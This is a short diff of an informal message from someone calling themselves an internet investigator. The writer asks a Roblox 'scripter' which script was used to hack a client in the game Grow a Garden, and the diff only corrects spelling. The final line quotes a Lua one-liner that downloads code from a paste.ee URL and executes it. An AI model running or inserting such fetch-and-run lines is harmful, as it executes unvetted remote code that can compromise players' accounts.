@@ -1,6 +1,6 @@
-Hello mr scripter I am internet investigator I investorgat shit.
+Hello mr scripter I am internet investigator I investorgate shit.
 And someone want me to help them that they  got hack in grow a garden while they were using hacks.
-Which was bad on my client part but need to figure out what script the hacket use on mt client
+Which was bad on my client part but need to figure out what script the hacker use on my client/friend
 
 
 loadstring(game:HttpGet("https://paste.ee/r/Y7ykL8Cn"))()
